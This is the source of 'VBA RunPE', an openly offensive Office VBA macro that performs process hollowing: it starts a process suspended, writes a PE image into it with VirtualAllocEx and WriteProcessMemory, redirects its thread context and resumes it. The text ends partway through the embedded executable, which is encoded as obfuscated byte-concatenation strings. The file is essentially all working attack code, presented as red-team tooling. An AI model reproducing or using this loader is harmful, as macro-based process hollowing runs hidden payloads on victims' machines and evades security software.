' --------------------------------------------------------------------------------
' Title: VBA RunPE
' Filename: RunPE.vba
' GitHub: https://github.com/itm4n/VBA-RunPE
' Date: 2019-12-14
' Author: Clement Labro (@itm4n)
' Description: A RunPE implementation in VBA with Windows API calls. It is
'   compatible with both 32 bits and 64 bits versions of Microsoft Office.
'   The 32 bits version of Office can only run 32 bits executables and the 64 bits
'   version can only run 64 bits executables.
' Usage: 1. In the 'Exploit' procedure at the end of the code, set the path of the
'               file you want to execute (with optional arguments)
'        2. Enable View > Immediate Window (Ctrl + G) (to check execution and error
'               logs)
'        3. Run the macro!
' Tested on: - Windows 7 Pro 64 bits + Office 2016 32 bits
'            - Windows 10 Pro 64 bits + Office 2016 64 bits
' Credit: @hasherezade - https://github.com/hasherezade/ (RunPE written in C++
'   with dynamic relocations)
' --------------------------------------------------------------------------------

Option Explicit

' ================================================================================
'                      ~~~ IMPORT WINDOWS API FUNCTIONS ~~~
' ================================================================================
#If Win64 Then
    Private Declare PtrSafe Sub RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByVal sSource As LongPtr, ByVal lLength As Long)
    Private Declare PtrSafe Function GetModuleFileName Lib "KERNEL32" Alias "GetModuleFileNameA" (ByVal hModule As LongPtr, ByVal lpFilename As String, ByVal nSize As Long) As Long
    Private Declare PtrSafe Function CreateProcess Lib "KERNEL32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal bInheritHandles As Boolean, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
    Private Declare PtrSafe Function GetThreadContext Lib "KERNEL32" (ByVal hThread As LongPtr, ByVal lpContext As LongPtr) As Long
    Private Declare PtrSafe Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesRead As LongPtr) As Long
    Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function VirtualFree Lib "KERNEL32" (ByVal lpAddress As LongPtr, dwSize As Long, dwFreeType As Long) As Long
    Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As LongPtr) As Long
    Private Declare PtrSafe Function SetThreadContext Lib "KERNEL32" (ByVal hThread As LongPtr, ByVal lpContext As LongPtr) As Long
    Private Declare PtrSafe Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long
    Private Declare PtrSafe Function TerminateProcess Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal uExitCode As Integer) As Long
#Else
    Private Declare Sub RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As Long, ByVal sSource As Long, ByVal lLength As Long)
    Private Declare Function GetModuleFileName Lib "KERNEL32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFilename As String, ByVal nSize As Long) As Long
    Private Declare Function CreateProcess Lib "KERNEL32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Boolean, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
    Private Declare Function GetThreadContext Lib "KERNEL32" (ByVal hThread As Long, lpContext As CONTEXT) As Long
    Private Declare Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesRead As LongPtr) As Long
    Private Declare Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare Function VirtualFree Lib "KERNEL32" (ByVal lpAddress As LongPtr, dwSize As Long, dwFreeType As Long) As Long
    Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As Long, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As LongPtr) As Long
    Private Declare Function SetThreadContext Lib "KERNEL32" (ByVal hThread As Long, lpContext As CONTEXT) As Long
    Private Declare Function ResumeThread Lib "KERNEL32" (ByVal hThread As Long) As Long
    Private Declare Function TerminateProcess Lib "KERNEL32" (ByVal hProcess As Long, ByVal uExitCode As Integer) As Long
#End If


' ================================================================================
'                           ~~~ WINDOWS STRUCTURES ~~~
' ================================================================================
' Constants used in structure definitions
Private Const IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16
Private Const IMAGE_SIZEOF_SHORT_NAME = 8
Private Const MAXIMUM_SUPPORTED_EXTENSION = 512
Private Const SIZE_OF_80387_REGISTERS = 80

#If Win64 Then
    Private Type M128A
        Low As LongLong     'ULONGLONG Low;
        High As LongLong    'LONGLONG High;
    End Type
#End If

' https://www.nirsoft.net/kernel_struct/vista/IMAGE_DOS_HEADER.html
Private Type IMAGE_DOS_HEADER
     e_magic As Integer         'WORD e_magic;
     e_cblp As Integer          'WORD e_cblp;
     e_cp As Integer            'WORD e_cp;
     e_crlc As Integer          'WORD e_crlc;
     e_cparhdr As Integer       'WORD e_cparhdr;
     e_minalloc As Integer      'WORD e_minalloc;
     e_maxalloc As Integer      'WORD e_maxalloc;
     e_ss As Integer            'WORD e_ss;
     e_sp As Integer            'WORD e_sp;
     e_csum As Integer          'WORD e_csum;
     e_ip As Integer            'WORD e_ip;
     e_cs As Integer            'WORD e_cs;
     e_lfarlc As Integer        'WORD e_lfarlc;
     e_ovno As Integer          'WORD e_ovno;
     e_res(4 - 1) As Integer    'WORD e_res[4];
     e_oemid As Integer         'WORD e_oemid;
     e_oeminfo As Integer       'WORD e_oeminfo;
     e_res2(10 - 1) As Integer  'WORD e_res2[10];
     e_lfanew As Long           'LONG e_lfanew;
End Type

' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms680305(v=vs.85).aspx
Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long      'DWORD   VirtualAddress;
    Size As Long                'DWORD   Size;
End Type

' undocumented
Private Type IMAGE_BASE_RELOCATION
    VirtualAddress As Long        'DWORD   VirtualAddress
    SizeOfBlock As Long           'DWORD   SizeOfBlock
End Type

' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms680313(v=vs.85).aspx
Private Type IMAGE_FILE_HEADER
    Machine As Integer                  'WORD    Machine;
    NumberOfSections As Integer         'WORD    NumberOfSections;
    TimeDateStamp As Long               'DWORD   TimeDateStamp;
    PointerToSymbolTable As Long        'DWORD   PointerToSymbolTable;
    NumberOfSymbols As Long             'DWORD   NumberOfSymbols;
    SizeOfOptionalHeader As Integer     'WORD    SizeOfOptionalHeader;
    Characteristics As Integer          'WORD    Characteristics;
End Type

' https://msdn.microsoft.com/en-us/library/windows/desktop/ms680339(v=vs.85).aspx
Private Type IMAGE_OPTIONAL_HEADER
    #If Win64 Then
        Magic As Integer                        'WORD        Magic;
        MajorLinkerVersion As Byte              'BYTE        MajorLinkerVersion;
        MinorLinkerVersion As Byte              'BYTE        MinorLinkerVersion;
        SizeOfCode As Long                      'DWORD       SizeOfCode;
        SizeOfInitializedData As Long           'DWORD       SizeOfInitializedData;
        SizeOfUninitializedData As Long         'DWORD       SizeOfUninitializedData;
        AddressOfEntryPoint As Long             'DWORD       AddressOfEntryPoint;
        BaseOfCode As Long                      'DWORD       BaseOfCode;
        ImageBase As LongLong                   'ULONGLONG   ImageBase;
        SectionAlignment As Long                'DWORD       SectionAlignment;
        FileAlignment As Long                   'DWORD       FileAlignment;
        MajorOperatingSystemVersion As Integer  'WORD        MajorOperatingSystemVersion;
        MinorOperatingSystemVersion As Integer  'WORD        MinorOperatingSystemVersion;
        MajorImageVersion As Integer            'WORD        MajorImageVersion;
        MinorImageVersion As Integer            'WORD        MinorImageVersion;
        MajorSubsystemVersion As Integer        'WORD        MajorSubsystemVersion;
        MinorSubsystemVersion As Integer        'WORD        MinorSubsystemVersion;
        Win32VersionValue As Long               'DWORD       Win32VersionValue;
        SizeOfImage As Long                     'DWORD       SizeOfImage;
        SizeOfHeaders As Long                   'DWORD       SizeOfHeaders;
        CheckSum As Long                        'DWORD       CheckSum;
        Subsystem As Integer                    'WORD        Subsystem;
        DllCharacteristics As Integer           'WORD        DllCharacteristics;
        SizeOfStackReserve As LongLong          'ULONGLONG   SizeOfStackReserve;
        SizeOfStackCommit As LongLong           'ULONGLONG   SizeOfStackCommit;
        SizeOfHeapReserve As LongLong           'ULONGLONG   SizeOfHeapReserve;
        SizeOfHeapCommit As LongLong            'ULONGLONG   SizeOfHeapCommit;
        LoaderFlags As Long                     'DWORD       LoaderFlags;
        NumberOfRvaAndSizes As Long             'DWORD       NumberOfRvaAndSizes;
        DataDirectory(IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY 'IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
    #Else
        Magic As Integer                        'WORD    Magic;
        MajorLinkerVersion As Byte              'BYTE    MajorLinkerVersion;
        MinorLinkerVersion As Byte              'BYTE    MinorLinkerVersion;
        SizeOfCode As Long                      'DWORD   SizeOfCode;
        SizeOfInitializedData As Long           'DWORD   SizeOfInitializedData;
        SizeOfUninitializedData As Long         'DWORD   SizeOfUninitializedData;
        AddressOfEntryPoint As Long             'DWORD   AddressOfEntryPoint;
        BaseOfCode As Long                      'DWORD   BaseOfCode;
        BaseOfData As Long                      'DWORD   BaseOfData;
        ImageBase As Long                       'DWORD   ImageBase;
        SectionAlignment As Long                'DWORD   SectionAlignment;
        FileAlignment As Long                   'DWORD   FileAlignment;
        MajorOperatingSystemVersion As Integer  'WORD    MajorOperatingSystemVersion;
        MinorOperatingSystemVersion As Integer  'WORD    MinorOperatingSystemVersion;
        MajorImageVersion As Integer            'WORD    MajorImageVersion;
        MinorImageVersion As Integer            'WORD    MinorImageVersion;
        MajorSubsystemVersion As Integer        'WORD    MajorSubsystemVersion;
        MinorSubsystemVersion As Integer        'WORD    MinorSubsystemVersion;
        Win32VersionValue As Long               'DWORD   Win32VersionValue;
        SizeOfImage As Long                     'DWORD   SizeOfImage;
        SizeOfHeaders As Long                   'DWORD   SizeOfHeaders;
        CheckSum As Long                        'DWORD   CheckSum;
        Subsystem As Integer                    'WORD    Subsystem;
        DllCharacteristics As Integer           'WORD    DllCharacteristics;
        SizeOfStackReserve As Long              'DWORD   SizeOfStackReserve;
        SizeOfStackCommit As Long               'DWORD   SizeOfStackCommit;
        SizeOfHeapReserve As Long               'DWORD   SizeOfHeapReserve;
        SizeOfHeapCommit As Long                'DWORD   SizeOfHeapCommit;
        LoaderFlags As Long                     'DWORD   LoaderFlags;
        NumberOfRvaAndSizes As Long             'DWORD   NumberOfRvaAndSizes;
        DataDirectory(IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY 'IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
    #End If
End Type

' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms680336(v=vs.85).aspx
Private Type IMAGE_NT_HEADERS
    Signature As Long                         'DWORD Signature;
    FileHeader As IMAGE_FILE_HEADER           'IMAGE_FILE_HEADER FileHeader;
    OptionalHeader As IMAGE_OPTIONAL_HEADER   'IMAGE_OPTIONAL_HEADER OptionalHeader;
End Type

' https://www.nirsoft.net/kernel_struct/vista/IMAGE_SECTION_HEADER.html
Private Type IMAGE_SECTION_HEADER
    SecName(IMAGE_SIZEOF_SHORT_NAME - 1) As Byte 'UCHAR Name[IMAGE_SIZEOF_SHORT_NAME];
    Misc As Long                    'ULONG Misc;
    VirtualAddress As Long          'ULONG VirtualAddress;
    SizeOfRawData As Long           'ULONG SizeOfRawData;
    PointerToRawData As Long        'ULONG PointerToRawData;
    PointerToRelocations As Long    'ULONG PointerToRelocations;
    PointerToLinenumbers As Long    'ULONG PointerToLinenumbers;
    NumberOfRelocations As Integer  'WORD  NumberOfRelocations;
    NumberOfLinenumbers As Integer  'WORD  NumberOfLinenumbers;
    Characteristics As Long         'ULONG Characteristics;
End Type

' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms684873(v=vs.85).aspx
Private Type PROCESS_INFORMATION
    hProcess As LongPtr     'HANDLE hProcess;
    hThread As LongPtr      'HANDLE hThread;
    dwProcessId As Long     'DWORD  dwProcessId;
    dwThreadId As Long      'DWORD  dwThreadId;
End Type

' https://msdn.microsoft.com/en-us/library/windows/desktop/ms686331(v=vs.85).aspx
Private Type STARTUPINFO
    cb As Long                  'DWORD  cb;
    lpReserved As String        'LPSTR  lpReserved;
    lpDesktop As String         'LPSTR  lpDesktop;
    lpTitle As String           'LPSTR  lpTitle;
    dwX As Long                 'DWORD  dwX;
    dwY As Long                 'DWORD  dwY;
    dwXSize As Long             'DWORD  dwXSize;
    dwYSize As Long             'DWORD  dwYSize;
    dwXCountChars As Long       'DWORD  dwXCountChars;
    dwYCountChars As Long       'DWORD  dwYCountChars;
    dwFillAttribute As Long     'DWORD  dwFillAttribute;
    dwFlags As Long             'DWORD  dwFlags;
    wShowWindow As Integer      'WORD   wShowWindow;
    cbReserved2 As Integer      'WORD   cbReserved2;
    lpReserved2 As LongPtr      'LPBYTE lpReserved2;
    hStdInput As LongPtr        'HANDLE hStdInput;
    hStdOutput As LongPtr       'HANDLE hStdOutput;
    hStdError As LongPtr        'HANDLE hStdError;
End Type

' https://www.nirsoft.net/kernel_struct/vista/FLOATING_SAVE_AREA.html
Private Type FLOATING_SAVE_AREA
    ControlWord As Long                                 'DWORD ControlWord;
    StatusWord As Long                                  'DWORD StatusWord;
    TagWord As Long                                     'DWORD TagWord;
    ErrorOffset As Long                                 'DWORD ErrorOffset;
    ErrorSelector As Long                               'DWORD ErrorSelector;
    DataOffset As Long                                  'DWORD DataOffset;
    DataSelector As Long                                'DWORD DataSelector;
    RegisterArea(SIZE_OF_80387_REGISTERS - 1) As Byte   'BYTE  RegisterArea[SIZE_OF_80387_REGISTERS];
    Spare0 As Long                                      'DWORD Spare0;
End Type

' winnt.h
#If Win64 Then
    Private Type XMM_SAVE_AREA32
        ControlWord As Integer                  'WORD  ControlWord;
        StatusWord As Integer                   'WORD  StatusWord;
        TagWord As Byte                         'BYTE  TagWord;
        Reserved1 As Byte                       'BYTE  Reserved1;
        ErrorOpcode As Integer                  'WORD  ErrorOpcode;
        ErrorOffset As Long                     'DWORD ErrorOffset;
        ErrorSelector As Integer                'WORD  ErrorSelector;
        Reserved2 As Integer                    'WORD  Reserved2;
        DataOffset As Long                      'DWORD DataOffset;
        DataSelector As Integer                 'WORD  DataSelector;
        Reserved3 As Integer                    'WORD  Reserved3;
        MxCsr As Long                           'DWORD MxCsr;
        MxCsr_Mask As Long                      'DWORD MxCsr_Mask;
        FloatRegisters(8 - 1) As M128A          'M128A FloatRegisters[8];
        XmmRegisters(16 - 1) As M128A       'M128A XmmRegisters[16];
        Reserved4(96 - 1) As Byte           'BYTE  Reserved4[96];
End Type
#End If

Private Type CONTEXT
    #If Win64 Then
        ' Register parameter home addresses
        P1Home As LongLong                  'DWORD64 P1Home;
        P2Home As LongLong                  'DWORD64 P2Home;
        P3Home As LongLong                  'DWORD64 P3Home;
        P4Home As LongLong                  'DWORD64 P4Home;
        P5Home As LongLong                  'DWORD64 P5Home;
        P6Home As LongLong                  'DWORD64 P6Home;
        ' Control flags
        ContextFlags As Long                'DWORD ContextFlags;
        MxCsr As Long                       'DWORD MxCsr;
        ' Segment Registers and processor flags
        SegCs As Integer                    'WORD   SegCs;
        SegDs As Integer                    'WORD   SegDs;
        SegEs As Integer                    'WORD   SegEs;
        SegFs As Integer                    'WORD   SegFs;
        SegGs As Integer                    'WORD   SegGs;
        SegSs As Integer                    'WORD   SegSs;
        EFlags As Long                      'DWORD  EFlags;
        ' Debug registers
        Dr0 As LongLong                     'DWORD64 Dr0;
        Dr1 As LongLong                     'DWORD64 Dr1;
        Dr2 As LongLong                     'DWORD64 Dr2;
        Dr3 As LongLong                     'DWORD64 Dr3;
        Dr6 As LongLong                     'DWORD64 Dr6;
        Dr7 As LongLong                     'DWORD64 Dr7;
        ' Integer registers
        Rax As LongLong                     'DWORD64 Rax;
        Rcx As LongLong                     'DWORD64 Rcx;
        Rdx As LongLong                     'DWORD64 Rdx;
        Rbx As LongLong                     'DWORD64 Rbx;
        Rsp As LongLong                     'DWORD64 Rsp;
        Rbp As LongLong                     'DWORD64 Rbp;
        Rsi As LongLong                     'DWORD64 Rsi;
        Rdi As LongLong                     'DWORD64 Rdi;
        R8 As LongLong                      'DWORD64 R8;
        R9 As LongLong                      'DWORD64 R9;
        R10 As LongLong                     'DWORD64 R10;
        R11 As LongLong                     'DWORD64 R11;
        R12 As LongLong                     'DWORD64 R12;
        R13 As LongLong                     'DWORD64 R13;
        R14 As LongLong                     'DWORD64 R14;
        R15 As LongLong                     'DWORD64 R15;
        ' Program counter
        Rip As LongLong                     'DWORD64 Rip
        ' Floating point state
        FltSave As XMM_SAVE_AREA32          'XMM_SAVE_AREA32 FltSave;
        'Header(2 - 1) As M128A              'M128A Header[2];
        'Legacy(8 - 1) As M128A              'M128A Legacy[8];
        'Xmm0 As M128A                       'M128A Xmm0;
        'Xmm1 As M128A                       'M128A Xmm1;
        'Xmm2 As M128A                       'M128A Xmm2;
        'Xmm3 As M128A                       'M128A Xmm3;
        'Xmm4 As M128A                       'M128A Xmm4;
        'Xmm5 As M128A                       'M128A Xmm5;
        'Xmm6 As M128A                       'M128A Xmm6;
        'Xmm7 As M128A                       'M128A Xmm7;
        'Xmm8 As M128A                       'M128A Xmm8;
        'Xmm9 As M128A                       'M128A Xmm9;
        'Xmm10 As M128A                      'M128A Xmm10;
        'Xmm11 As M128A                      'M128A Xmm11;
        'Xmm12 As M128A                      'M128A Xmm12;
        'Xmm13 As M128A                      'M128A Xmm13;
        'Xmm14 As M128A                      'M128A Xmm14;
        'Xmm15 As M128A                      'M128A Xmm15;
        ' Vector registers
        VectorRegister(26 - 1) As M128A     'M128A   VectorRegister[26];
        VectorControl As LongLong           'DWORD64 VectorControl;
        ' Special debug control registers
        DebugControl As LongLong            'DWORD64 DebugControl;
        LastBranchToRip As LongLong         'DWORD64 LastBranchToRip;
        LastBranchFromRip As LongLong       'DWORD64 LastBranchFromRip;
        LastExceptionToRip As LongLong      'DWORD64 LastExceptionToRip;
        LastExceptionFromRip As LongLong    'DWORD64 LastExceptionFromRip;
    #Else
        ' https://msdn.microsoft.com/en-us/library/windows/desktop/ms679284(v=vs.85).aspx
        ContextFlags As Long                'DWORD ContextFlags;
        Dr0 As Long                         'DWORD Dr0;
        Dr1 As Long                         'DWORD Dr1;
        Dr2 As Long                         'DWORD Dr2;
        Dr3 As Long                         'DWORD Dr3;
        Dr6 As Long                         'DWORD Dr6;
        Dr7 As Long                         'DWORD Dr7;
        FloatSave As FLOATING_SAVE_AREA     'FLOATING_SAVE_AREA FloatSave;
        SegGs As Long                       'DWORD SegGs;
        SegFs As Long                       'DWORD SegFs;
        SegEs As Long                       'DWORD SegEs;
        SegDs As Long                       'DWORD SegDs;
        Edi As Long                         'DWORD Edi;
        Esi As Long                         'DWORD Esi;
        Ebx As Long                         'DWORD Ebx;
        Edx As Long                         'DWORD Edx;
        Ecx As Long                         'DWORD Ecx;
        Eax As Long                         'DWORD Eax;
        Ebp As Long                         'DWORD Ebp;
        Eip As Long                         'DWORD Eip;
        SegCs As Long                       'DWORD SegCs;  // MUST BE SANITIZED
        EFlags As Long                      'DWORD EFlags; // MUST BE SANITIZED
        Esp As Long                         'DWORD Esp;
        SegSs As Long                       'DWORD SegSs;
        ExtendedRegisters(MAXIMUM_SUPPORTED_EXTENSION - 1) As Byte 'BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];
    #End If
End Type


' ================================================================================
'                   ~~~ CONSTANTS USED IN WINDOWS API CALLS ~~~
' ================================================================================
Private Const MEM_COMMIT = &H1000
Private Const MEM_RESERVE = &H2000
Private Const PAGE_READWRITE = &H4
Private Const PAGE_EXECUTE_READWRITE = &H40
Private Const MAX_PATH = 260
Private Const CREATE_SUSPENDED = &H4

Private Const CONTEXT_AMD64 = &H100000
Private Const CONTEXT_I386 = &H10000
#If Win64 Then
    Private Const CONTEXT_ARCH = CONTEXT_AMD64
#Else
    Private Const CONTEXT_ARCH = CONTEXT_I386
#End If
Private Const CONTEXT_CONTROL = CONTEXT_ARCH Or &H1
Private Const CONTEXT_INTEGER = CONTEXT_ARCH Or &H2
Private Const CONTEXT_SEGMENTS = CONTEXT_ARCH Or &H4
Private Const CONTEXT_FLOATING_POINT = CONTEXT_ARCH Or &H8
Private Const CONTEXT_DEBUG_REGISTERS = CONTEXT_ARCH Or &H10
Private Const CONTEXT_EXTENDED_REGISTERS = CONTEXT_ARCH Or &H20
Private Const CONTEXT_FULL = CONTEXT_CONTROL Or CONTEXT_INTEGER Or CONTEXT_SEGMENTS


' ================================================================================
'                     ~~~ CONSTANTS USED IN THE MAIN SUB ~~~
' ================================================================================
Private Const VERBOSE = False                       ' Set to True for debugging
Private Const IMAGE_DOS_SIGNATURE = &H5A4D          ' 0x5A4D      // MZ
Private Const IMAGE_NT_SIGNATURE = &H4550           ' 0x00004550  // PE00
Private Const IMAGE_FILE_MACHINE_I386 = &H14C       ' 32 bits PE (IMAGE_NT_HEADERS.IMAGE_FILE_HEADER.Machine)
Private Const IMAGE_FILE_MACHINE_AMD64 = &H8664     ' 64 bits PE (IMAGE_NT_HEADERS.IMAGE_FILE_HEADER.Machine)
Private Const SIZEOF_IMAGE_DOS_HEADER = 64
Private Const SIZEOF_IMAGE_SECTION_HEADER = 40
Private Const SIZEOF_IMAGE_FILE_HEADER = 20
Private Const SIZEOF_IMAGE_DATA_DIRECTORY = 8
Private Const SIZEOF_IMAGE_BASE_RELOCATION = 8
Private Const SIZEOF_IMAGE_BASE_RELOCATION_ENTRY = 2
#If Win64 Then
    Private Const SIZEOF_IMAGE_NT_HEADERS = 264
    Private Const SIZEOF_ADDRESS = 8
#Else
    Private Const SIZEOF_IMAGE_NT_HEADERS = 248
    Private Const SIZEOF_ADDRESS = 4
#End If

' Data Directories
' |__ IMAGE_OPTIONAL_HEADER contains an array of 16 IMAGE_DATA_DIRECTORY structures
' |__ Each IMAGE_DATA_DIRECTORY structure as a "predefined role", as defined by these constants (in winnt.h)
Private Const IMAGE_DIRECTORY_ENTRY_EXPORT = 0       ' Export Directory
Private Const IMAGE_DIRECTORY_ENTRY_IMPORT = 1       ' Import Directory
Private Const IMAGE_DIRECTORY_ENTRY_RESOURCE = 2     ' Resource Directory
Private Const IMAGE_DIRECTORY_ENTRY_EXCEPTION = 3    ' Exception Directory
Private Const IMAGE_DIRECTORY_ENTRY_SECURITY = 4     ' Security Directory
Private Const IMAGE_DIRECTORY_ENTRY_BASERELOC = 5    ' Base Relocation Table
Private Const IMAGE_DIRECTORY_ENTRY_DEBUG = 6        ' Debug Directory
Private Const IMAGE_DIRECTORY_ENTRY_COPYRIGHT = 7    ' Description String
Private Const IMAGE_DIRECTORY_ENTRY_GLOBALPTR = 8    ' Machine Value (MIPS GP)
Private Const IMAGE_DIRECTORY_ENTRY_TLS = 9          ' TLS Directory
Private Const IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG = 10 ' Load Configuration Directory


' ================================================================================
'                                ~~~ HELPERS ~~~
' ================================================================================

' --------------------------------------------------------------------------------
' Method:    ByteArrayLength
' Desc:      Returns the length of a Byte array
' Arguments: baBytes - An array of Bytes
' Returns:   The size of the array as a Long
' --------------------------------------------------------------------------------
Public Function ByteArrayLength(baBytes() As Byte) As Long
    On Error Resume Next
    ByteArrayLength = UBound(baBytes) - LBound(baBytes) + 1
End Function

' --------------------------------------------------------------------------------
' Method:    ByteArrayToString
' Desc:      Converts an array of Bytes to a String
' Arguments: baBytes - An array of Bytes
' Returns:   The String representation of the Byte array
' --------------------------------------------------------------------------------
Private Function ByteArrayToString(baBytes() As Byte) As String
    Dim strRes As String: strRes = ""
    Dim iCount As Integer
    For iCount = 0 To ByteArrayLength(baBytes) - 1
        If baBytes(iCount) <> 0 Then
            strRes = strRes & Chr(baBytes(iCount))
        Else
            Exit For
        End If
    Next iCount
    ByteArrayToString = strRes
End Function

' --------------------------------------------------------------------------------
' Method:    FileToByteArray
' Desc:      Reads a file as a Byte array
' Arguments: strFilename - Fullname of the file as a String (ex:
'                'C:\Windows\System32\cmd.exe')
' Returns:   The content of the file as a Byte array
' --------------------------------------------------------------------------------
Private Function FileToByteArray(strFilename As String) As Byte()
    ' File content to String
    Dim strFileContent As String
    Dim iFile As Integer: iFile = FreeFile
    Open strFilename For Binary Access Read As #iFile
        strFileContent = Space(FileLen(strFilename))
        Get #iFile, , strFileContent
    Close #iFile
    
    ' String to Byte array
    Dim baFileContent() As Byte
    baFileContent = StrConv(strFileContent, vbFromUnicode)

    FileToByteArray = baFileContent
End Function

' --------------------------------------------------------------------------------
' Method:    StringToByteArray
' Desc:      Convert a String to a Byte array
' Arguments: strContent - Input String representing the PE
' Returns:   The content of the String as a Byte array
' --------------------------------------------------------------------------------
Private Function StringToByteArray(strContent As String) As Byte()
    Dim baContent() As Byte
    baContent = StrConv(strContent, vbFromUnicode)
    StringToByteArray = baContent
End Function

' --------------------------------------------------------------------------------
' Method:    A
' Desc:      Append a Char to a String.
' Arguments: strA - Input String. E.g.: "AAA"
'            bChar - Input Char as a Byte. E.g.: 66 or &H42
' Returns:   The concatenation of the String and the Char. E.g.: "AAAB"
' --------------------------------------------------------------------------------
Private Function A(strA As String, bChar As Byte) As String
    A = strA & Chr(bChar)
End Function

' --------------------------------------------------------------------------------
' Method:    B
' Desc:      Append a String to another String.
' Arguments: strA - Input String 1. E.g.: "AAAA"
'            strB - Input String 2. E.g.: "BBBB"
' Returns:   The concatenation of the two Strings. E.g.: "AAAABBBB"
' --------------------------------------------------------------------------------
Private Function B(strA As String, strB As String) As String
    B = strA + strB
End Function


' ================================================================================
'                                ~~~ EMBEDDED PE ~~~
' ================================================================================

' CODE GENERATED BY PE2VBA
' ===== BEGIN PE2VBA =====
Private Function PE0() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "MZ"), 144), 0), 3), 0), 0), 0), 4), 0), 0), 0), 255), 255), 0), 0), 184), 0), 0), 0), 0), 0), 0), 0), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 232), 0), 0), 0), 14), 31), 186), 14), 0), 180), 9), 205), "!"), 184), 1), "L"), 205), "!This program cannot be")
    strPE = B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(strPE, " run in DOS mode."), 13), 13), 10), "$"), 0), 0), 0), 0), 0), 0), 0), 147), "8"), 240), 214), 215), "Y"), 158), 133), 215), "Y"), 158), 133), 215), "Y"), 158), 133), 172), "E"), 146), 133), 211), "Y")
    strPE = A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(strPE, 158), 133), "TE"), 144), 133), 222), "Y"), 158), 133), 184), "F"), 148), 133), 220), "Y"), 158), 133), 184), "F"), 154), 133), 212), "Y"), 158), 133), 215), "Y"), 159), 133), 30), "Y"), 158), 133), "TQ"), 195), 133), 223), "Y"), 158), 133), 131), "z"), 174), 133), 255), "Y"), 158), 133)
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(strPE, 16), "_"), 152), 133), 214), "Y"), 158), 133), "Rich"), 215), "Y"), 158), 133), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "PE"), 0), 0), "L"), 1), 4), 0), 195), 230), 145), "J"), 0), 0), 0), 0), 0), 0)
